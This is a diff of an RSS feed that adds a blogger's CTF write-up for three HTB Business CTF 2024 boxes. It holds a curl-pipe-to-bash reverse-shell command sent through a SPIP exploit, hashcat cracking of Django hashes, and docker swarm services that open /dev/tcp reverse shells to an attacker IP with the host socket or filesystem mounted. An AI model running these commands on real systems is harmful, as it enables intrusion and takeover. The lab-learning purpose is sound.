@@ -1,4 +1,156 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on</title><link>https://blog.ikuamike.io/tags/ctf/</link><description>Recent content in CTF on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 22 May 2024 00:25:15 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB Business CTF 2024 WriteUp - Misc</title><link>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc/</link><pubDate>Wed, 22 May 2024 00:25:15 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on</title><link>https://blog.ikuamike.io/tags/ctf/</link><description>Recent content in CTF on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 22 May 2024 18:22:15 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB Business CTF 2024 WriteUp - FullPwn</title><link>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_fullpwn/</link><pubDate>Wed, 22 May 2024 18:22:15 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_fullpwn/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>After a long while since I participated in a CTF, I had the pleasure to participate in &lt;a href="https://ctf.hackthebox.com/event/details/htb-business-ctf-2024-the-vault-of-hope-1474" target="_blank" rel="noopener">HTB Business CTF 2024&lt;/a>
+these past few days. I enjoyed myself despite having only solved a handful of challenges. I went solo and didn&amp;rsquo;t rank quite high but I&amp;rsquo;m still pleased with myself.&lt;/p>
+&lt;p>In this post, I&amp;rsquo;ll cover the challenges I solved under the FullPwn category which is similar to the HTB Boxes that you perform initial access and escalate to root.&lt;/p>
+&lt;p>FYI: It&amp;rsquo;s a long post.&lt;/p>
+&lt;h2 id="1-submerged">1. Submerged&lt;/h2>
+&lt;p>This challenge was rated &lt;strong>Very Easy&lt;/strong>.&lt;/p>
+&lt;h3 id="initial-access">Initial Access&lt;/h3>
+&lt;p>We&amp;rsquo;ll begin by performing a full portscan on the provided IP using Nmap.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_1.png" class="center" style="border-radius: 8px;" />
+&lt;p>From the output, we only have port 80 open and it redirects to submerged.htb.&lt;/p>
+&lt;p>We can add the domain to our hosts file, but I&amp;rsquo;ll use a new trick I learnt using burp so I don&amp;rsquo;t have to modify my hosts file each time.&lt;/p>
+&lt;p>On Burp Suite, go to:&lt;/p>
+&lt;p>&lt;strong>Settings -&amp;gt; Network -&amp;gt; Connections -&amp;gt; Hostname resolution overrides&lt;/strong>.&lt;/p>
+&lt;p>Then add the hostname and IP.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_2.png" class="center" style="border-radius: 8px;" />
+&lt;p>Once this is set, we can access the site via the browser that comes with Burp.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_3.png" class="center" style="border-radius: 8px;" />
+&lt;p>There&amp;rsquo;s not much on the site apart from a link to another subdomain &lt;strong>spip.submerged.htb&lt;/strong>. We&amp;rsquo;ll add the hostname to burp as we did earlier.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_4.png" class="center" style="border-radius: 8px;" />
+&lt;p>Visiting this new subdomain, there&amp;rsquo;s no content on the site, we only see mentions of spip. I did a quick google search on any exploits related to spip and came across this script from exploitdb.&lt;/p>
+&lt;p>&lt;a href="https://www.exploit-db.com/exploits/51536" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/51536&lt;/a>
+&lt;/p>
+&lt;p>Since I didn&amp;rsquo;t confirm the version of spip, I just executed the exploit hoping it works. I was then able to get a reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>http_proxy&lt;span style="color:#f92672">=&lt;/span>127.0.0.1:8080 python 51536.py --url http://spip.submerged.htb -c &lt;span style="color:#e6db74">&amp;#39;curl http://10.10.14.95:9000/revshell.sh | bash&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The command downloads the reverse shell script from my web server and executes it, I use http_proxy to forward the request through burp since the hostname is configured there.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_5.png" class="center" style="border-radius: 8px;" />
+&lt;p>After getting our shell, we can read user.txt.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_12.png" class="center" style="border-radius: 8px;" />
+&lt;p>user.txt: &lt;strong>HTB{SpIP_Abu53_4_RC3}&lt;/strong>&lt;/p>
+&lt;h3 id="privilege-escalation">Privilege Escalation&lt;/h3>
+&lt;p>Privilege Escalation to root is also straightforward as the user we have has sudo permission with no password.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_6.png" class="center" style="border-radius: 8px;" />
+&lt;p>However, we do not get the root.txt in the root folder. After some enumeration, it was nowhere to found on the server.&lt;/p>
+&lt;p>Something I found peculiar was that when checking running processes, only a small number of them were listed which is not normal output for a linux server and a /init process running as root.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_7.png" class="center" style="border-radius: 8px;" />
+&lt;p>This init binary is present in / and it&amp;rsquo;s a 64 bit executable. Extracting strings from it, revealed several references of WSL indicating we were inside a WSL instance.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>strings /init
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_8.png" class="center" style="border-radius: 8px;" />
+&lt;p>Within WSL the host filesystem is usually accessible under /mnt/c, but this was not available.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_9.png" class="center" style="border-radius: 8px;" />
+&lt;p>I came across this link that gave the solution to this problem.&lt;/p>
+&lt;p>&lt;a href="https://exploit-notes.hdks.org/exploit/windows/wsl/wsl-pentesting/" target="_blank" rel="noopener">https://exploit-notes.hdks.org/exploit/windows/wsl/wsl-pentesting/&lt;/a>
+&lt;/p>
+&lt;p>It seems the C: drive was not mounted automatically, therefore, we could just mount it.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>mount -t drvfs C: /mnt/c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_10.png" class="center" style="border-radius: 8px;" />
+&lt;p>With access to the C: drive we can read root.txt on administrator&amp;rsquo;s desktop to complete the challenge.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_11.png" class="center" style="border-radius: 8px;" />
+&lt;p>root.txt: &lt;strong>HTB{Pwn1ng_WsL_4_7h3_W1n}&lt;/strong>&lt;/p>
+&lt;h2 id="2-survivor">2. Survivor&lt;/h2>
+&lt;p>This challenge was rated &lt;strong>Easy&lt;/strong>.&lt;/p>
+&lt;h3 id="initial-access-1">Initial Access&lt;/h3>
+&lt;p>Let&amp;rsquo;s start with full portscan using Nmap.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_1.png" class="center" style="border-radius: 8px;" />
+&lt;p>From the scan output we have port 22 and 80 open. Focusing on port 80, it redirects to survivor.htb.&lt;/p>
+&lt;p>Similar to the previous challenge, we add the hostname to burp and visit the page. On the site we have a few posts and on one of the posts discover a new subdomain fuxa.survivor.htb.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_2.png" class="center" style="border-radius: 8px;" />
+&lt;p>Adding this new hostname and loading it, we see the app is called Fuxa by frangoteam&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_3.png" class="center" style="border-radius: 8px;" />
+&lt;p>After it loads, we don&amp;rsquo;t have much functionality. I decided to search for any exploits for this software and found this repo on Github.&lt;/p>
+&lt;p>&lt;a href="https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831" target="_blank" rel="noopener">https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831&lt;/a>
+&lt;/p>
+&lt;p>The exploit script works and we get a reverse shell. We get user.txt.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_4.png" class="center" style="border-radius: 8px;" />
+&lt;p>user.txt: &lt;strong>HTB{FuXa_ExPloIT_4_RC3}&lt;/strong>&lt;/p>
+&lt;h3 id="privilege-escalation-1">Privilege Escalation&lt;/h3>
+&lt;p>On performing enumeration on the server, I didn&amp;rsquo;t find vulnerable software or misconfiguration on sudo or any cron jobs. I then decided to look at the kernel. I came across this exploit that seems appropriate for our case.&lt;/p>
+&lt;p>&lt;a href="https://github.com/Notselwyn/CVE-2024-1086/releases" target="_blank" rel="noopener">https://github.com/Notselwyn/CVE-2024-1086/releases&lt;/a>
+&lt;/p>
+&lt;p>Downloading the compiled exploit binary and executing on our target successfully gets us a root shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_5.png" class="center" style="border-radius: 8px;" />
+&lt;p>root.txt: &lt;strong>HTB{KeRnEnL_ExP_4_r00t}&lt;/strong>&lt;/p>
+&lt;h2 id="3-swarm">3. Swarm&lt;/h2>
+&lt;p>This challenge was also rated &lt;strong>Easy&lt;/strong>.&lt;/p>
+&lt;h3 id="initial-access-2">Initial Access&lt;/h3>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_1.png" class="center" style="border-radius: 8px;" />
+&lt;p>From the nmap scan we see we have port 80 open and it redirects to swarm.htb. We also have a Docker Registry running on port 5000.&lt;/p>
+&lt;p>After adding the hostname and visiting the site, it has a few posts but nothing seems interesting.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_2.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can collect the names of the post authors as potential usernames for the login page. We also have an admin portal, indicating that this is a django app.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_7.png" class="center" style="border-radius: 8px;" />
+&lt;p>After not getting any viable path to attack the site, I switched to looking at the registry.&lt;/p>
+&lt;p>Since the registry has no interface to interact with, we have to hit the endpoints directly. On docker registry /v2/_catalog endpoint list the repositories.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_3.png" class="center" style="border-radius: 8px;" />
+&lt;p>We see that we have newsbox-web repo. If we visit /v2/newsbox-web/tags/list we can see the tags which will tell us the docker image present.&lt;/p>
+&lt;p>Here we have one image - newsbox-web:latest.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_4.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can then pull the docker image locally.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker pull swarm.htb:5000/newsbox-web:latest
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After pulling the image, let&amp;rsquo;s run a container and inspect the contents.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker run --rm -it swarm.htb:5000/newsbox-web:latest /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Upon running the container, we see there&amp;rsquo;s a db present. We can use docker cp to retrieve the sqlite db to our host.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_5.png" class="center" style="border-radius: 8px;" />
+&lt;p>I used sqlitebrowser to read the contents. In the auth_user table, we get the password hashes for the users.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sqlitebrowser db.sqlite3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_6.png" class="center" style="border-radius: 8px;" />
+&lt;p>I stored the hashes in a ttxt and used hashcat to try and crack them to get passwords.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>hashcat -a &lt;span style="color:#ae81ff">0&lt;/span> -m &lt;span style="color:#ae81ff">10000&lt;/span> django_hashes.txt /usr/share/wordlists/rockyou.txt --force
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_8.png" class="center" style="border-radius: 8px;" />
+&lt;p>We successfully crack one hash and get the password &lt;code>pennypenny99&lt;/code> this hash is for the user &lt;code>PenniesForThoughts&lt;/code>.&lt;/p>
+&lt;p>We can login to site but we still get nothing useful. Trying this password on SSH, we are able to login but we have to use the username &lt;code>plessing&lt;/code> which is the name on the email.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_9.png" class="center" style="border-radius: 8px;" />
+&lt;p>user.txt: &lt;strong>HTB{b3_f1r5t_b3_5m4rt3r_0r_ch34t}&lt;/strong>&lt;/p>
+&lt;h3 id="privilege-escalation-2">Privilege Escalation&lt;/h3>
+&lt;p>For privilege escalation, enumeration led us to discover that the user plessing can run the docker swarm command as root.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_10.png" class="center" style="border-radius: 8px;" />
+&lt;p>Abusing this functionlity for privilege escalation took me a while to figure out. Let&amp;rsquo;s get into it.&lt;/p>
+&lt;p>First we set up a docker swarm on our attacker machine, then join the target server as a worker node.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_11.png" class="center" style="border-radius: 8px;" />
+&lt;p>With the target part of our swarm, we can create a docker service that will launch a container of our choosing on the nodes.&lt;/p>
+&lt;p>During my research on how I can mount stuff in the docker container, I learnt that I can mount the docker socket of the server inside the container.&lt;/p>
+&lt;p>My idea was to mount the docker socket into the container, then run another privileged docker container and get access to the host filesystem of our target server.&lt;/p>
+&lt;p>The only problem I had was to get the docker binary into the container. To solve this I needed to get a container that contains wget/curl and to get a static docker binary. The static docker binary I could download from the link below.&lt;/p>
+&lt;p>&lt;a href="https://download.docker.com/linux/static/stable/x86_64/" target="_blank" rel="noopener">https://download.docker.com/linux/static/stable/x86_64/&lt;/a>
+&lt;/p>
+&lt;p>For the docker container I could either build one or get one off of dockerhub, I chose to look for one and landed on this one below.&lt;/p>
+&lt;p>&lt;a href="https://hub.docker.com/r/devorbitus/ubuntu-bash-jq-curl" target="_blank" rel="noopener">https://hub.docker.com/r/devorbitus/ubuntu-bash-jq-curl&lt;/a>
+&lt;/p>
+&lt;p>Now let&amp;rsquo;s get attacking:&lt;/p>
+&lt;p>&lt;code>Step 1:&lt;/code> Push the container image to the target&amp;rsquo;s registry from our attacker machine.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker tag devorbitus/ubuntu-bash-jq-curl:latest swarm.htb:5000/ubuntu-bash-jq-curl:v1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker push swarm.htb:5000/ubuntu-bash-jq-curl:v1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Step 2:&lt;/code> Create the docker service to launch our container on the worker node (which is our target server) with the docker socket mounted inside, then get command execution inside the container.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker service create --constraint node.role&lt;span style="color:#f92672">==&lt;/span>worker --name pwn --mount type&lt;span style="color:#f92672">=&lt;/span>bind,source&lt;span style="color:#f92672">=&lt;/span>/var/run/docker.sock,target&lt;span style="color:#f92672">=&lt;/span>/var/run/docker.sock,ro swarm.htb:5000/ubuntu-bash-jq-curl:latest /bin/bash -c &lt;span style="color:#e6db74">&amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.95/8000 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_12.png" class="center" style="border-radius: 8px;" />
+&lt;p>At this point we have command execution on the container running on the target.&lt;/p>
+&lt;p>&lt;code>Step 3:&lt;/code> Download the docker static binary into the container, so we can interact with docker on the target server.&lt;/p>
+&lt;p>I set up a python web server on my attacker machine, then used curl to download the docker binary on to the container.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_13.png" class="center" style="border-radius: 8px;" />
+&lt;p>Now we confirm we can interact with docker on the target host.&lt;/p>
+&lt;p>&lt;code>Step 4:&lt;/code> Run another container mounting the filesystem of the host into that container.&lt;/p>
+&lt;p>We successfully mount the filesystem of the host into the new container and can read the root flag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_14.png" class="center" style="border-radius: 8px;" />
+&lt;p>root.txt: &lt;strong>HTB{5tunG_bY_th3_5w4rm}&lt;/strong>&lt;/p>
+&lt;h3 id="post-ctf">Post CTF&lt;/h3>
+&lt;p>After the CTF and other solutions were posted, I realized I could have just mounted the filesystem at the beginning and skip the whole process of creating multiple containers and having to download the docker binary.&lt;/p>
+&lt;p>As you can see when creating the service, we set the source and destination to the filesystem of the host and container respectively.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker service create --constraint node.role&lt;span style="color:#f92672">==&lt;/span>worker --name pwn --mount type&lt;span style="color:#f92672">=&lt;/span>bind,source&lt;span style="color:#f92672">=&lt;/span>/,target&lt;span style="color:#f92672">=&lt;/span>/mnt,ro swarm.htb:5000/ubuntu-bash-jq-curl:latest /bin/bash -c &lt;span style="color:#e6db74">&amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.95/8000 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_15.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>Sorry for the long post, I had a good time working on the challenges and documenting all of it including the things I learn are part of my way of playing CTFs so I never forget.&lt;/p>
+&lt;p>It seems the rating of the challenges was skewed towards experienced players as some of the easy ones took some time to complete, hats off to HTB for the CTF. Can&amp;rsquo;t wait to play the next one. The platform is really smooth to use.&lt;/p>
+&lt;p>If you think I should have broken it up into individual posts for each challenge, let me know! You can reach me on twitter &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">@ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Thanks for reading!&lt;/p></content></item><item><title>HTB Business CTF 2024 WriteUp - Misc</title><link>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc/</link><pubDate>Wed, 22 May 2024 00:25:15 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
 &lt;h2 id="introduction">Introduction&lt;/h2>
 &lt;p>In this post, I&amp;rsquo;ll be covering solutions to the Misc Challenges from the &lt;a href="https://ctf.hackthebox.com/event/details/htb-business-ctf-2024-the-vault-of-hope-1474" target="_blank" rel="noopener">HTB Business CTF 2024&lt;/a>
 .&lt;/p>
